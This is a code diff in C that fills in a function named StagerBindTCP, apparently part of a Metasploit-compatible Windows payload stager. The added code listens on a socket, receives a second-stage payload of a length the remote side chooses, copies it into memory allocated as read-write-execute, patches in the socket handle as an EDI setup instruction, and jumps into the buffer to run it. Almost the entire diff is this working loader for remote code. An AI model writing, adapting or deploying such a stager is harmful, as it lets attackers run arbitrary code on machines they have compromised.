@@ -109,7 +109,48 @@ void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
 
 void StagerBindTCP(wchar_t* IP, wchar_t* iPort)
 {
+	SOCKET sckt;
+	int len = 0;
+	char* buff;
+	int count = 0;
 
+	sckt = get_server_socket(IP, iPort);
+	if (sckt == INVALID_SOCKET)
+	{
+		dprintf(L"[-] Failed to connect ... will exit!\n");
+		exit(1);
+	}
+	dprintf(L"[+] Socket: %d\n", sckt);
+
+	dprintf(L"[*] Listening on \"%s:%s\"\n", IP, iPort);
+
+	count = recv(sckt, (char*)&len, 4, NULL);
+	if (count != 4 || len <= 0) 
+	{
+		dprintf(L"[-] We connected, but something went wrong while receiving stage size ... will exit!\n");			
+		exit(1);
+	}
+
+	dprintf(L"[*] Stage length = \"%d\" bytes.\n", len);
+	buff = (char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE) ; //allocate
+	if (buff == NULL)
+	{
+		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
+		exit(1);
+	}
+
+	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", (len + 5));
+
+	recv(sckt, buff + 5, len, MSG_WAITALL);
+
+	dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
+	buff[0] = (char)0xBF;
+
+	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
+	memcpy(buff+1, &sckt, 4);
+
+	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
+	(*(void (*)())buff)();
 };
 
 SOCKET get_server_socket(wchar_t* IP, wchar_t* iPort)
